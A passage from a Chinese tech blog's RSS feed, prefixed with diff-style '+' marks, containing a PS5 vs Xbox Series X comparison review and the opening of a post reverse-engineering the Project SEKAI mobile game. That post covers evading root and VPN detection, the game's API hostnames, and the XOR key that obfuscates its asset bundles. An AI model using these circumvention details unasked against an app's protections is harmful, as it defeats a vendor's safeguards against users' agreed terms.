+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-15.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-15-1024x572.png" alt="Xbox Series X 标配手柄与 PS5 DualSense 中，只有一款是减噪设计" class="wp-image-2361" width="399" height="222" srcset="https://dev.moe/wp-content/uploads/2021/06/image-15-1024x572.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-15-300x168.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-15-768x429.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-15.png 1389w" sizes="(max-width: 399px) 100vw, 399px" /></a><figcaption>Xbox Series X 标配手柄与 PS5 DualSense 中，只有一款是减噪设计</figcaption></figure></div>
+
+
+
+<figure class="wp-block-table is-style-stripes"><table><tbody><tr><td></td><td><strong>标配手柄</strong></td><td><strong>耳机</strong></td><td><strong>评分</strong></td></tr><tr><td>PS5</td><td>有减噪设计，有一些声音</td><td>手柄可插有线耳机<br>主机只支持专用无线耳机<br>主机可插 USB 蓝牙声卡</td><td><strong>4/5</strong></td></tr><tr><td>Xbox Series X|S</td><td>无减噪设计，声音大</td><td>手柄可插有线耳机<br>主机只支持专用无线耳机<br>不支持第三方 USB 声卡 </td><td>1/5</td></tr></tbody></table></figure>
+
+
+
+<p>另外，两款主机都支持用手机连接主机远程游玩，然后将蓝牙耳机连接至手机，以此曲线救国，获得连接任意蓝牙耳机的能力（有一定延迟）。</p>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<p>有意思的是，PS5 是自己会感觉比较吵，而 Xbox Series X|S 则是身边的人会感觉比较吵。</p>
+
+
+
+<h2>创新</h2>
+
+
+
+<p>Sony 的创新一如既往，每代总有新东西。除了系统界面焕新外，PS5 的手柄 DualSense 在上一代手柄 DualShock 4 已有的触控板、陀螺仪的基础上，又增加了<strong>自适应扳机</strong>、<strong>麦克风</strong>（及静音按钮），并且强化了 3D 震动与手柄扬声器的音质。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-6.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-6-1024x576.png" alt="全新的 PS5 系统，遗憾的是并非全面的进步。PS4 系统的主题与自定义壁纸功能被取消。" class="wp-image-2352" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-6-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-6-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-6-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-6-1536x864.png 1536w, https://dev.moe/wp-content/uploads/2021/06/image-6-1568x882.png 1568w, https://dev.moe/wp-content/uploads/2021/06/image-6.png 1920w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>PS5 系统焕然一新，不过没了主题和自定义壁纸的功能</figcaption></figure></div>
+
+
+
+<p><strong>这些机能在 PS5 自带的 Astro&#8217;s Playroom 游戏中发挥得淋漓尽致</strong>，让人上手惊呼“这才是次世代”。遗憾的是，在其他游戏中，这些机能用的并不多，也用得并不那么惊艳。好在手柄价格并未因此上涨太多，这些机能有总比没有好——<strong>在 PS5 的游戏中，我们可以期待会有更好的瞄准体验，以及更真实的震感、触感；在 PS5 的网战中，也可默认每位玩家都会有麦克风可用</strong>。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-4.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-4-1024x576.png" alt="按下 DualSense 手柄的扳机键，阻力会变。外加 3D 震动，让玩家感受到游戏的真实。" class="wp-image-2350" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-4-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-4-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-4-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-4-1536x864.png 1536w, https://dev.moe/wp-content/uploads/2021/06/image-4-1568x882.png 1568w, https://dev.moe/wp-content/uploads/2021/06/image-4.png 1920w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>阻力会变的自适应扳机与 3D 震动的结合 (Astro&#8217;s Playroom, PS5)</figcaption></figure></div>
+
+
+
+<p>在软件上，PS5 加入了<strong>无剧透指南</strong>功能（需 PS Plus 会员），游戏卡关时无需上网查攻略，按下 PS 按钮，即可直接查看游戏开发者制作的无剧透视频指南。还可以使用新的分屏功能，把指南/网页固定在屏幕两侧，边看边玩游戏。</p>
+
+
+
+<p>另外，PS5 兼容 PS4 时代的 <strong>PS VR</strong>，为 PS5 打造的<a href="https://blog.playstation.com/2021/03/18/next-gen-vr-on-ps5-the-new-controller/" target="_blank" rel="noreferrer noopener">次世代 VR 也在开发中</a>。Xbox 则依然未见支持 VR 的计划。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/vr.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/vr-1024x575.png" alt="极具未来感的次世代 VR，图片来自 Sony 博客。" class="wp-image-2343" width="424" height="237" srcset="https://dev.moe/wp-content/uploads/2021/06/vr-1024x575.png 1024w, https://dev.moe/wp-content/uploads/2021/06/vr-300x168.png 300w, https://dev.moe/wp-content/uploads/2021/06/vr-768x431.png 768w, https://dev.moe/wp-content/uploads/2021/06/vr.png 1275w" sizes="(max-width: 424px) 100vw, 424px" /></a><figcaption>极具未来感的次世代 VR (Sony)</figcaption></figure></div>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<p>Xbox Series X 的创新比起 PS5 并不多，最大的创新或许是 <strong>Quick Resume</strong> 功能。<strong>玩家可以随时在多款游戏中来回切换，不会丢失一点进度。甚至在机器正常关机并断电后，仍可返回原来的游戏进度。</strong>值得一提的是，从 PS5 快捷菜单的设计来看，Sony 可能也有计划加入类似 Quick Resume 的功能。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-1024x576.png" alt="Xbox 有了 Quick Resume，游戏可以随时切换，不会丢失进度。" class="wp-image-2344" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>有了 Quick Resume，游戏想切就切 (Xbox)</figcaption></figure></div>
+
+
+
+<p>Xbox Series X 还有优化老游戏的 FPS Boost 及 Auto HDR 功能。</p>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<p><em><strong>PS5 4.5/5</strong></em>（手柄创新多、系统新功能多、支持 VR）<em><strong><br></strong>Xbox Series X 3/5</em>（Quick Resume 等，相比上代变化不大）</p>
+
+
+
+<h2>性能（分辨率、帧率、画面表现）</h2>
+
+
+
+<p>从参数上看，Xbox Series X 的 CPU 与 GPU 性能更好；PS5 的硬盘性能更好。</p>
+
+
+
+<p>实际游戏表现也基本与参数一致——Xbox Series X 部分游戏画面及帧率更优，PS5 部分游戏读盘速度更优。举例来说，Hitman 3 在 Xbox Series X 上可达到 2160p 60fps，而在  PS5 上仅有 1800p 60fps；Scarlet Nexus Demo 在 PS5 上读取速度会比 Xbox Series X 快 2-3 秒。</p>
+
+
+
+<h3>老游戏性能</h3>
+
+
+
+<p>也许是传承了 Microsoft 的作风，<strong>Xbox Series X|S 对老游戏的兼容相当不错。</strong>不仅可以兼容 Xbox 2001 年发布以来的大多数游戏，还设计了 FPS Boost（<a href="https://majornelson.com/fpsboost/" target="_blank" rel="noreferrer noopener">支持游戏列表</a>）及 Auto HDR 等功能，可以提升老游戏的分辨率、解锁帧率及提升画面表现。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-5.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-5-1024x576.png" alt="Xbox 可以在部分老游戏开启 Auto HDR 和 FPS Boost 功能，让老游戏焕发新生。" class="wp-image-2351" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-5-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-5-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-5-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-5.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>老游戏新生 (Xbox)</figcaption></figure></div>
+
+
+
+<p>PS5 可兼容 PS4 的游戏，但对画面及帧率的提升有限。</p>
+
+
+
+<h3>120fps</h3>
+
+
+
+<p>由于有 FPS Boost 的加持，Xbox Series X 已有上百款游戏兼容 120fps。PS5 目前支持 120fps 的游戏仅有十几款 。</p>
+
+
+
+<p>此外，由于 PS5 的 HDMI 带宽仅有 32Gbps（Xbox Series X 为 40Gbps，完整版 HDMI 2.1 为 48Gbps），在 PS5 上使用 4K 120Hz 时，画面将降级为 YUV420，好在看上去并没有太大区别。</p>
+
+
+
+<h3>其他</h3>
+
+
+
+<ul><li><strong>PS5 不支持输出 1440p 画面。</strong>如果玩家的显示器为 1440p (2K)，且不支持 4K 输入，则将只能在 1080p 下使用 PS5。由于存在非整数倍放大，体验将比使用 1080p 显示器更差。Xbox 支持 1440p 输出。</li><li><strong>Xbox Series X|S 的<strong>系统 UI</strong> 仍在使用 1080p（4K 界面已于 2021 年 8 月开始内测，预计 2021 年冬正式推出），文字边缘模糊。</strong>PS5 的系统 UI 则全面支持 4K HDR，文字图案锐利清晰，且免去打开 HDR 游戏时的模式切换。</li><li>Xbox Series X|S 已支持 AMD FreeSync &amp; HDMI 2.1 VRR（可变帧率）及 Dolby Vision（杜比视界）。PS5 承诺未来更新支持 VRR。</li><li>随着 AMD 推出 FidelityFX Super Resolution（FSR，类似 Nvidia 的 DLSS），可预见两款主机未来会有更多观感更好的 4K 光追游戏。</li><li>Xbox 玩家可以在天猫花 ￥20 购买 Dolby Atmos（杜比全景声），在使用耳机时获得听声辨位的体验。</li></ul>
+
+
+
+<p><em>PS5 3/5</em>（系统 UI 锐利清晰，图形性能稍差）<em><br><strong>Xbox Series X 4.5/5</strong></em>（老游戏性能更好、新游戏性能也更好、120fps 及 HDMI 2.1 支持更完善）</p>
+
+
+
+<h2>区域锁及价格</h2>
+
+
+
+<p>Xbox Series X、PS5 主机：建议零售价一致，均仍频繁缺货。</p>
+
+
+
+<h3>Xbox</h3>
+
+
+
+<ul><li><strong>++ 帐号不绑定区域，可随意出入各区商店</strong></li><li><strong>++ 游戏不分区域，可低价区购买（多币种信用卡），换商店下载想要的语言版本（除极少数例外，如鬼泣5）</strong></li><li><strong>++ Xbox Game Pass Ultimate（XGPU）订阅包含 300+ 游戏及 EA Play，大作及新游戏很多，质量极高</strong>（<a href="https://www.xbox.com/zh-TW/xbox-game-pass/games" target="_blank" rel="noreferrer noopener">游戏库</a>）</li><li>+ XGPU 自带的 Xbox Live Gold 会员每月可领 3+ 免费小游戏，质量一般，锁区游戏可跨区领取（<a href="https://xbox.fandom.com/wiki/List_of_Games_with_Gold" target="_blank" rel="noreferrer noopener">历史游戏列表</a>）</li><li>+ 大部分第一方游戏及 XGPU 游戏同时支持 PC 版，一次购买双平台游玩</li><li>+ 云存档免费，部分游戏可同步存档到 PC 上继续游玩，但存档逻辑设计一般（有丢存档案例），不支持存档本地备份</li><li>&#8211; 需要 Xbox Live Gold 才能联机游戏</li><li>+ 支持自助退款（不可滥用）</li><li>+ 可与一位信任的朋友互换帐号游玩双方的库</li><li>&#8211; 支持普通硬盘扩展储存（仅可运行上世代游戏），本世代游戏需购买 Xbox 专用硬盘扩容</li><li>&#8211; 实体版游戏货源不多，实体盘可出二手</li></ul>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-2.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-2-1024x576.png" alt="数了一下目前的 Xbox Game Pass 游戏库，竟有 300 多款游戏，这还没算上 EA Play 的 70 多款游戏。" class="wp-image-2346" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-2-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-2-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-2-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-2.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>数了一下目前的 Xbox Game Pass 游戏库 ——共有 51 行（这还没算上 EA Play 的 70+ 游戏）</figcaption></figure></div>
+
+
+
+<h3>PS5</h3>
+
+
+
+<ul><li>&#8211; 帐号绑定区域，不支持换区</li><li>&#8211; 游戏分多个区域版本，中文版大多仅在高价区有售</li><li><strong>++ PS Plus 会员可通过 PS Plus Collection 获得约 20 款 PS4 知名经典游戏，质量极高</strong></li><li>+ 美区/日区有 PS Now 游戏订阅，可游玩 400+ 游戏（部分仅支持远程游玩），但订阅价格高，中文游戏少（<a href="https://www.playstation.com/en-us/ps-now/ps-now-games/" target="_blank" rel="noreferrer noopener">美区游戏库</a>）</li><li><strong>++ PS Plus 会员每月可领 3+ 免费游戏，质量有时极高，不可跨区领取</strong>（<a href="https://zh.wikipedia.org/zh/PlayStation_Plus%E6%AF%8F%E6%9C%88%E5%85%8D%E8%B2%BB%E9%81%8A%E6%88%B2%E5%88%97%E8%A1%A8%EF%BC%88%E6%B8%AF%E5%8F%B0%E5%8D%80%EF%BC%89" target="_blank" rel="noreferrer noopener">历史游戏列表</a>）</li><li>+ 仅 PS Plus 会员支持云存档，存档逻辑设计较好，PS5 游戏不支持存档本地备份</li><li>&#8211; 需要 PS Plus 才能联机游戏</li><li>&#8211; 不支持自助退款（联系客服可能有一次退款机会）</li><li>+ 可与一位信任的朋友互换帐号游玩双方的库</li><li>+ 支持普通硬盘扩展储存（仅可运行上世代游戏），本世代游戏可购买指定型号的通用硬盘扩容</li><li>+ 实体版游戏货源丰富，可租实体游戏游玩</li></ul>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-7.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-7-1024x576.png" alt="PS5 玩家拿到机器，开通 PS Plus 会员后，可以立即获得 20 款 PS4 经典大作。" class="wp-image-2353" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-7-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-7-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-7-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-7-1536x864.png 1536w, https://dev.moe/wp-content/uploads/2021/06/image-7-1568x882.png 1568w, https://dev.moe/wp-content/uploads/2021/06/image-7.png 1920w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>20 款知名经典游戏，开会员即玩 (PS5)</figcaption></figure></div>
+
+
+
+<p>在 Xbox 上，利用巴西等低价区可用接近一半的价格购买游戏。Xbox Game Pass（XGP）游戏库内也有大量的大作（甚至发售当日的作品）可以直接游玩，没有试错成本。</p>
+
+
+
+<p><em>PS5 2/5</em>（三家里唯一仍在锁游戏区域、帐号区域；中文游戏贵；开会员每月有游戏可领，偶现优秀作品）<br><em><strong>Xbox 4.5/5</strong></em>（三家里最宽松的区域政策；淘宝每年约￥200 即可畅玩 XGP 游戏库，可能会涨价）</p>
+
+
+
+<h2>独占游戏</h2>
+
+
+
+<p>PlayStation 平台一直有不少独占游戏（部分独占游戏发布几年后会进入其他平台），如果想玩这些游戏，又不想等待，购买一台 PlayStation 主机可能是玩家唯一的选择。</p>
+
+
+
+<p>在 Microsoft 收购大量游戏工作室后，可以预见 Xbox 平台也将有不少独占游戏。不过 Microsoft 对于 Xbox 独占的定义是 Xbox + Windows 商店，因此如果已拥有一台价格昂贵的高性能 PC，没有必要再购买 Xbox。</p>
+
+
+
+<p><em>PS5 0/5</em>（评分为玩家角度，非股东角度）<br><strong><em>Xbox 1/5</em></strong>（评分为玩家角度，不过至少 Windows 也能玩）</p>
+
+
+
+<h2>远程游玩及分享</h2>
+
+
+
+<figure class="wp-block-table is-style-stripes"><table><tbody><tr><td></td><td><strong>远程游玩</strong></td><td><strong>直播推流</strong></td><td><strong>截屏及录制</strong></td><td><strong>评分</strong></td></tr><tr><td>PS5</td><td>手机及PC：最高 1080p HDR</td><td>1080p 60fps<br>交互体验很好<br>YouTube / Twitch</td><td>获得奖杯时自动截屏及录制<br>交互体验很好<br>录制时间长</td><td><strong>4.5/5</strong></td></tr><tr><td>Xbox Series X|S</td><td>手机：720p<br>PC：1080p<br>不支持 HDR</td><td>1080p 60fps<br>交互体验较差<br>仅支持 Twitch </td><td>交互体验差<br>仅支持录制较短时长</td><td>2/5</td></tr></tbody></table></figure>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<p>上世代 Xbox 曾经拥有体验不错的局域网远程游玩（Console Companion 应用）及设计精良的 Mixer 直播平台（延迟极低，甚至支持观众与游戏互动）。可是到了 Xbox Series X|S，两者都被砍了。Xbox Series X|S 的截屏及录制则与上一代区别不大，手柄加了个独立的截屏按钮，录制、分享体验依旧只是勉强能用的程度（截图要弹两条挡屏幕的通知，录制只能录几分钟）。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-9.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-9-1024x576.png" alt="在 Xbox 中可以录制过去发生的事，但有时间限制。" class="wp-image-2355" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-9-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-9-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-9-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-9.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>录制过去发生的事&#8230; (Xbox)</figcaption></figure></div>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-10.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-10-1024x576.png" alt="在 Xbox 中，1080p 只能录制 1 分钟。" class="wp-image-2356" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-10-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-10-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-10-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-10.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>&#8230;但最长 1 分钟 (Xbox)</figcaption></figure></div>
+
+
+
+<p>PS5 则是相比上一代全面提升，远程游玩支持了 HDR，直播推流更方便，截屏及录制的交互也再度升级，获得奖杯时还会自动生成一段录像，更加完善好用。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/achievement.jpg"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/achievement-1024x576.jpg" alt="PS5 会自动录制获得成就的精彩瞬间，以及之前30秒发生的故事。" class="wp-image-2349" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/achievement-1024x576.jpg 1024w, https://dev.moe/wp-content/uploads/2021/06/achievement-300x169.jpg 300w, https://dev.moe/wp-content/uploads/2021/06/achievement-768x432.jpg 768w, https://dev.moe/wp-content/uploads/2021/06/achievement-1536x864.jpg 1536w, https://dev.moe/wp-content/uploads/2021/06/achievement-1568x882.jpg 1568w, https://dev.moe/wp-content/uploads/2021/06/achievement.jpg 1920w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>自动记录获得成就的精彩瞬间，以及之前30秒发生的故事 (PS5)</figcaption></figure></div>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-11.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-11-1024x577.png" alt="PS5 的分享界面可以录制过去发生的事（图中显示可以录制 60 分钟）、截图、开始录制，以及推流到直播平台。" class="wp-image-2357" width="512" height="289" srcset="https://dev.moe/wp-content/uploads/2021/06/image-11-1024x577.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-11-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-11-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-11-1536x865.png 1536w, https://dev.moe/wp-content/uploads/2021/06/image-11-1568x883.png 1568w, https://dev.moe/wp-content/uploads/2021/06/image-11.png 1920w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>录制过去发生的事、截图、开始录制，以及开始推流 (PS5) </figcaption></figure></div>
+
+
+
+<p>需要注意，由于 PS5 手柄自带麦克风，如果推流时无需录音，每次推流时需手动关闭麦克风。</p>
+
+
+
+<h2>维护及维修</h2>
+
+
+
+<p>更换风扇及清灰：在清灰设计上，PS5 设计了专用清灰孔，可以使用吸尘器直接清灰，拆装风扇也无需戳破保修标签。Xbox Series X 如果拆机会破坏保修标签，只能尝试使用高压空气除尘。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://images.pushsquare.com/7ca47b655e6e4/ps5-playstation-5-dust-catcher-1.original.jpg" alt="PS5 的清灰孔之一，用吸尘器可以清灰。" width="656" height="369"/><figcaption>清灰孔之一 (PS5)</figcaption></figure></div>
+
+
+
+<p>固态硬盘：PS5 的固态硬盘是焊在主板上的，寿命耗尽后机器或将报废。Xbox Series X 内置的固态硬盘可更换（会破坏保修贴，过程较复杂）。</p>
+
+
+
+<p>更换光驱：两款机器均不支持更换光驱模块，如光驱损坏需要移植光驱电路板。如电路板损坏，只能联系官方售后。</p>
+
+
+
+<p>参考：iFixit、<a href="https://www.youtube.com/watch?v=nyKUVmJmAGY" target="_blank" rel="noreferrer noopener">TronicsFix</a></p>
+
+
+
+<p><strong><em>PS5 3/5</em></strong>（清灰方案经过精心设计，清灰便利）<br><em>Xbox 2/5</em>（不破坏保修贴无法拆机清灰，硬盘可更换）</p>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<p>可以看出，PS5 的愿景要更高，系统设计上也更精致。尽管性能非本世代最强，但 Sony 希望用更好的系统体验与手柄交互，让玩家触摸到次世代的魅力。PlayStation 也是目前唯一提供非玩具级 VR 的游戏主机。然而，由于帐号无法跨区，同一游戏也分多区域版本，购买中文游戏价格通常较高。往往需要等待促销，或是通过租游戏盘的方式来省钱。</p>
+
+
+
+<p>Xbox 系统则传承了 Microsoft “能用就行”的传统，功能都有，但也不精致。当主机已经支持 8K 分辨率时，系统竟仍在以 1080p 渲染。好在 Microsoft 没有在关键的游戏体验上将就——Xbox 杀手级的 Xbox Game Pass 游戏库，极为宽松的区域锁政策，以及极为优异的噪音控制，一个个解决了玩家的痛点，让玩家以零成本发现优秀游戏，也不再让玩家成为正版的“受害者”。</p>
+
+
+
+<p>现在看来，我花的时间在 Xbox 上多一些，花的钱倒是在 PlayStation 上多一些。</p>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<p><strong>P.S.</strong> 本世代的 Xbox 还有一款 Xbox Series S。个人并不推荐购买 Xbox Series S，该型号兼容模式运行的是 Xbox One S 的游戏（弱于 PS4 Slim），分辨率仅 900p；新游戏也因性能受限，影响画质或分辨率。如果选择 Xbox Series X，则性能会提升到本世代最优（兼容模式下为 Xbox One X，强于 PS4 Pro）。因此建议仅在对画质无要求，以及希望随身携带主机的情况下考虑 Xbox Series S。</p>
+
+
+
+<p><strong>Coxxs</strong></p>
+
+
+
+<blockquote class="wp-block-quote"><p>本文（<a href="https://dev.moe/2216">https://dev.moe/2216</a>）由 Coxxs 原创，禁止转载。</p></blockquote>
+<p><a rel="nofollow" href="https://dev.moe/2216">PS5 Vs. Xbox Series X 对比简评</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://dev.moe/2216/feed</wfw:commentRss>
+			<slash:comments>2</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">2216</post-id>	</item>
+		<item>
+		<title>Project SEKAI 游戏分析</title>
+		<link>https://dev.moe/2157</link>
+					<comments>https://dev.moe/2157#comments</comments>
+		
+		<dc:creator><![CDATA[Coxxs]]></dc:creator>
+		<pubDate>Sun, 29 Nov 2020 07:38:28 +0000</pubDate>
+				<category><![CDATA[Code]]></category>
+		<guid isPermaLink="false">https://dev.moe/?p=2157</guid>
+
+					<description><![CDATA[<p>惊闻初音出了新手游，熟练地打开 Play 下载、运行，游戏也熟练地用流畅的动画弹出「通信エラーが発生しました」<a class="more-link" href="https://dev.moe/2157">继续阅读<span class="screen-reader-text">"Project SEKAI 游戏分析"</span></a></p>
+<p><a rel="nofollow" href="https://dev.moe/2157">Project SEKAI 游戏分析</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p>惊闻初音出了新手游，熟练地打开 Play 下载、运行，游戏也熟练地用流畅的动画弹出「通信エラーが発生しました」。嗯，毕竟是喜爱滥用 SafetyNet 的日系软件。</p>
+
+
+
+<p>上滑返回，将游戏加入 MagiskHide 列表中。清除数据，打开游戏，接着——「通信エラーが発生しました」。嗯？怎么回事？再次返回确认设置、清理数据，错误依旧。渐渐地回忆起被 Disney+ Widevine L1 支配的恐惧，莫非这游戏也强制了 SafetyNet Hardware-backed Key Attestation？</p>
+
+
+
+<span id="more-2157"></span>
+
+
+
+<p></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/unnamed.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/unnamed-1024x576.png" alt="" class="wp-image-2166" width="540" height="303" srcset="https://dev.moe/wp-content/uploads/2020/11/unnamed-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2020/11/unnamed-300x169.png 300w, https://dev.moe/wp-content/uploads/2020/11/unnamed-768x432.png 768w, https://dev.moe/wp-content/uploads/2020/11/unnamed.png 1138w" sizes="(max-width: 540px) 100vw, 540px" /></a><figcaption>包含了 Live2D 动画的 Press START 画面</figcaption></figure></div>
+
+
+
+<p>打开搜索引擎，敲入“Project SEKAI 无法连接”。哦！原来是检测到了加速器。测试发现这游戏大概是用了 GeoIP2 Anonymous IP Database 之类的库，看来是有备而来。鉴于游戏 Press START 界面的设计异常的有诚意，并没有点到为止。一通折腾之后成功进入了游戏。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">assetbundle.sekai.colorfulpalette.org
+assetbundle-info.sekai.colorfulpalette.org
+game-version.sekai.colorfulpalette.org
+production-game-api.sekai.colorfulpalette.org
+production-web.sekai.colorfulpalette.org
+# 别问，我不知道这是啥</pre>
+
+
+
+<h2>游戏资源分析</h2>
+
+
+
+<p>同<a href="https://dev.moe/1282" target="_blank" rel="noreferrer noopener">此前分析</a>的一款游戏（Dream Blast）一样，是使用 il2cpp 编译的 Unity 游戏。</p>
+
+
+
+<p>游戏资源主要分为两类，本地资源与按需下载（OnDemand）资源。本地资源用 AssetStudio 直接解包即可，按需下载资源缓存在 <code>sdcard/Android/data/{package name}/data</code> 下。</p>
+
+
+
+<h3>资源混淆</h3>
+
+
+
+<p>按需下载资源使用 <code>Sekai.AssetBundleManager.XORStream</code>（libil2cpp.so）函数进行了简单的混淆，去除 0x4 字节的 flag 后，对头部 0x80 字节进行了与 <code>FF FF FF FF FF 00 00 00</code> 的 xor 操作。这种混淆方式基本不影响性能，但却能有效浪费分析者时间，可以说是不错的权衡。</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/image-9.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/image-9-1024x269.png" alt="" class="wp-image-2158" width="483" height="126" srcset="https://dev.moe/wp-content/uploads/2020/11/image-9-1024x269.png 1024w, https://dev.moe/wp-content/uploads/2020/11/image-9-300x79.png 300w, https://dev.moe/wp-content/uploads/2020/11/image-9-768x202.png 768w, https://dev.moe/wp-content/uploads/2020/11/image-9.png 1027w" sizes="(max-width: 483px) 100vw, 483px" /></a><figcaption>这个头部一开始以为是自研的文件打包格式，原来是 xor 后的 UnityFS&#8230;</figcaption></figure>
+
+
+
+<p>写了一个简单的程序 <a href="https://github.com/Coxxs/sekai-xor" target="_blank" rel="noreferrer noopener">sekai-xor</a>，对混淆过的资源进行批量解密。</p>
+
+
+
+<h3>Live2D 资源</h3>
+
+
+
+<p>Live2D 资源未经加密，但储存结构、方式似乎与其他游戏有所不同，因此无法直接使用 <a href="https://github.com/Perfare/UnityLive2DExtractor" target="_blank" rel="noreferrer noopener nofollow">UnityLive2DExtractor</a> 进行导出。其中模型文件直接储存为了 <code>.png</code>、<code>.moc3</code>、<code>.model3.json</code>、<code>.physics3.json</code> 格式，可以直接使用 AssetStudio 导出并查看。</p>
+
+
+
